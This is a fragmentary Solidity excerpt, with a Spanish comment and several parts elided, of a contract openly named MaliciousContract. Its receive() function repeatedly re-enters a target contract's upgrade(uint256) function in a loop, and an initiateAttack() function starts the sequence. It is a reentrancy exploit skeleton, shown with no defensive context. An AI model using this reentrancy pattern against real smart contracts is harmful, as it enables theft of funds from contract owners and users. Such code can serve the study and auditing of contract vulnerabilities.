...
contract MaliciousContract {
    ...
    receive() external payable {
        if (attackCount < MAX_ATTACK_COUNT) {
            ...
            // Realizar la reentrancia llamando a upgrade repetidamente
            for (uint256 i = 0; i < BATCH_SIZE; i++) {
                (bool success2,) = address(target).call(abi.encodeWithSignature("upgrade(uint256)", 1 ether));
                require(success2, "Failed to call upgrade");
            }
        } else {
    ...
    function initiateAttack() private {
        ...
        (bool success1,) = address(target).call(abi.encodeWithSignature("upgrade(uint256)", 1 ether));
